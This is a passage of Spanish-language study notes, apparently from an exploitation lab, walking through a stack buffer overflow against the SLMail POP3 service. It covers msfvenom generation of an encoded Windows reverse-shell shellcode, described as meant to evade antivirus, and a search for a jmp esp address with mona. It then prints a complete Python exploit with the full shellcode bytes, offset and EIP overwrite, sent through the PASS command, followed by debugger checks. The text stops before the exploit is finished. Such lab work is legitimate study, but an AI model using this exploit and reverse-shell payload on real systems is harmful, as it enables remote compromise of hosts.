

Ahora sabiendo cuales son los badchars que tiene el servicio ahora sigue generar un shellcode que se encargue de entablar una reverse shell esta debe ser un conjunto de instrucciones en hexadecimal para meterlas en la pila para que cuando esta se interpretada nos permita ganar acceso a la maquina esto se puede hacer con ayuda de msfvenom 

Primero lo que tenemos que hacer es saber que payload vamos a utlizar para listar los payload podemos usar el siguiente comando 

```bash 
msfvenom -l payloads
```

Este nos mostrara todos los payloads existentes que se pueden utlizar en nuestro caso que queremos hacer una reverse shell utilizaremos este

![[Pasted image 20240309115124.png]]

Otra cosa que tenemos que tener encuenta es que encoder vamos a utilizar para listarlos todos podemos hacerlo con el siguiente comando


```bash
msfvenom -l encoders
```

Este nos mostrara todos los encoders disponibles por defecto casi siempre se utiliza el shikata_ga_nai  en nuestro caso es el que utlizaremos

![[Pasted image 20240309121759.png]]

Ahora ya todo esto identificado ya podemos crear nuestro shellcode para esto podemos utlizar el siguiente comando


![[Pasted image 20240309122928.png]]

Este comando genera un payload malicioso para Windows de 32 bits que establece una conexión de shell inverso utilizando TCP hacia una dirección IP en un puerto especifacado, utilizando una técnica de codificación para evadir la detección de antivirus y evitando ciertos bytes para asegurar una ejecución más efectiva.

Ahora al ejecutarlo nos da nuestro shellcode 

![[Pasted image 20240309123035.png]]

Este shellcode lo copiamos ya que luego lo vamos utilizar en el exploit para insertarlo en la pila para que sea interpretado y nos envie una consola interactiva a nuestra maquina atacante pero antes tenemos que encontrar los opcodes ya que no le podemos decir a EIP que vaya directamente al ESP por lo que lo mejor es apuntar a una direccion que aplique como opcode y de un salto para el ESP entonces lo que vamos hacer es ejecutar el siguiente comando en immunty debugger 

![[Pasted image 20240309194509.png]]

Al ejeuctarlo nos muestra una lista de protecciones la idea es utilizar una direccion donde todas las protecciones esten todas tornadas a false por ejemplo podemos seleccionar el siguiente dll 

![[Pasted image 20240309195608.png]]

Ya con este identificado ahora lo que vamos hacer es tratar de buscar es una instruccion de tipo jmp esp para ver si dentro de esta dll hay una direccion que aplique este opcode asi hacemos que el EIP apunte a esta direccion y de esta forma se aplique un salto al ESP entonces como lo vamos a lograr el opcode correspondiente al jmp esp tenemos que saber cual es para eso podmes usar la siguiente herramienta de metasploit 

![[Pasted image 20240309202027.png]]

Al ejecutar esta herramienta escribimos jmp esp y le damos al enter esto nos dara esto que corresponde al jmp esp

![[Pasted image 20240309202218.png]]

Entonces ahora ya con esto y con el modulo que vamos a utlizar nos dirigimos al immunity debugger y con ayuda de mona usamos el siguiente comando 

![[Pasted image 20240309202729.png]]

Esto si lo ejecutamos nos mostrara una serie de direcciones entonces lo siguiente que tienes que hacer es escoger cualquier direccion pero que esta no tenga los badchars que habiamos detectado en este caso podemos identificar la siguiente 

![[Pasted image 20240309203419.png]]


Ahora lo siguiente que tendriamos que hacer es copiar la direccion y con esta y el shellcode antes generado modifcar el exploit quedaria de la siguiente manera


```python

#!/usr/bin/python3.11
from struct import pack

import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=pack("<L",0x5f4c4d13)

shellcode=(b"\xdb\xc2\xbe\xa1\x84\x28\xe1\xd9\x74\x24\xf4\x5a\x2b\xc9"
b"\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\xd3\x97\xca\x14\xef"
b"\x70\x88\xd7\x0f\x81\xed\x5e\xea\xb0\x2d\x04\x7f\xe2\x9d"
b"\x4e\x2d\x0f\x55\x02\xc5\x84\x1b\x8b\xea\x2d\x91\xed\xc5"
b"\xae\x8a\xce\x44\x2d\xd1\x02\xa6\x0c\x1a\x57\xa7\x49\x47"
b"\x9a\xf5\x02\x03\x09\xe9\x27\x59\x92\x82\x74\x4f\x92\x77"
b"\xcc\x6e\xb3\x26\x46\x29\x13\xc9\x8b\x41\x1a\xd1\xc8\x6c"
b"\xd4\x6a\x3a\x1a\xe7\xba\x72\xe3\x44\x83\xba\x16\x94\xc4"
b"\x7d\xc9\xe3\x3c\x7e\x74\xf4\xfb\xfc\xa2\x71\x1f\xa6\x21"
b"\x21\xfb\x56\xe5\xb4\x88\x55\x42\xb2\xd6\x79\x55\x17\x6d"
b"\x85\xde\x96\xa1\x0f\xa4\xbc\x65\x4b\x7e\xdc\x3c\x31\xd1"
b"\xe1\x5e\x9a\x8e\x47\x15\x37\xda\xf5\x74\x50\x2f\x34\x86"
b"\xa0\x27\x4f\xf5\x92\xe8\xfb\x91\x9e\x61\x22\x66\xe0\x5b"
b"\x92\xf8\x1f\x64\xe3\xd1\xdb\x30\xb3\x49\xcd\x38\x58\x89"
b"\xf2\xec\xcf\xd9\x5c\x5f\xb0\x89\x1c\x0f\x58\xc3\x92\x70"
b"\x78\xec\x78\x19\x13\x17\xeb\xe6\x4c\x17\x6b\x8e\x8e\x17"
b"\x6a\xf4\x06\xf1\x06\x1a\x4f\xaa\xbe\x83\xca\x20\x5e\x4b"
b"\xc1\x4d\x60\xc7\xe6\xb2\x2f\x20\x82\xa0\xd8\xc0\xd9\x9a"
b"\x4f\xde\xf7\xb2\x0c\x4d\x9c\x42\x5a\x6e\x0b\x15\x0b\x40"
b"\x42\xf3\xa1\xfb\xfc\xe1\x3b\x9d\xc7\xa1\xe7\x5e\xc9\x28"
b"\x65\xda\xed\x3a\xb3\xe3\xa9\x6e\x6b\xb2\x67\xd8\xcd\x6c"
b"\xc6\xb2\x87\xc3\x80\x52\x51\x28\x13\x24\x5e\x65\xe5\xc8"
b"\xef\xd0\xb0\xf7\xc0\xb4\x34\x80\x3c\x25\xba\x5b\x85\x45"
b"\x59\x49\xf0\xed\xc4\x18\xb9\x73\xf7\xf7\xfe\x8d\x74\xfd"
b"\x7e\x6a\x64\x74\x7a\x36\x22\x65\xf6\x27\xc7\x89\xa5\x48"
b"\xc2")
payload=before_eip+eip+shellcode 

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```

Ahora vamos a comprobar si realmente el flujo del programa va a ir a la direccion especificada y si de verdad se va a entrar al ESP para comprobar esto primero tendremos que reiniciar el immunity debugger y el slmail ya reniciados nos dirigimos en al immunity debugger y presionamos el siguiente boton

![[Pasted image 20240309212854.png]]

Al presionarlo nos saldra una ventana donde ingresaremos al anterior direccion que hemos encontrado al especificarla le damos click al boton de ok

![[Pasted image 20240309213209.png]]

Si nos fijamos podemos ver que el opcode tiene un jmp esp

![[Pasted image 20240309213458.png]]

Entonces lo que vamos a hacer es meter un breakpoint en esta direccion para ver si el flujo del programa pasa por aqui para eso seleccionamos donde queremos colocar el break point y presionamos f2 nos aparecera este mensaje pero indicamos que si queremso poner el break point

![[Pasted image 20240309213905.png]]

Ahora vamos a ver si al ejecutar el exploit el EIP corresponde al valor de 5f4ced13 entonces ejecutamos el exploit

![[Pasted image 20240309214348.png]]

Y si ahora nos dirigimos al immunity debugger podemos ver que claramente el EIP vale la direccion que especificamos 


![[Pasted image 20240309214457.png]]

Ahora bien si ahora el EIP esta apuntando a la direccion que especificamos que es la que contempla la siguiente instruccion que se tiene que ejecutar la cual es la que salta al esp por tanto si en verdad se va a aplicar un salto al ESP el valor del ESP se tiene que ver representado en el EIP entonces si ahora nosotros clikeamos el siguiente boton el cual hace que se salte al siguiente instruccion 


![[Pasted image 20240309215044.png]]

Al darle click podemos ver que EIP se iguala a lo que vale ESP esto significa que el EIP ahora esta entrado al ESP que es donde se encuentra nuestro shellcode


![[Pasted image 20240309215352.png]]

Lamentablemente el shellcode no sera aun no sera interpretado para eso se le tiene que dar un espacio 






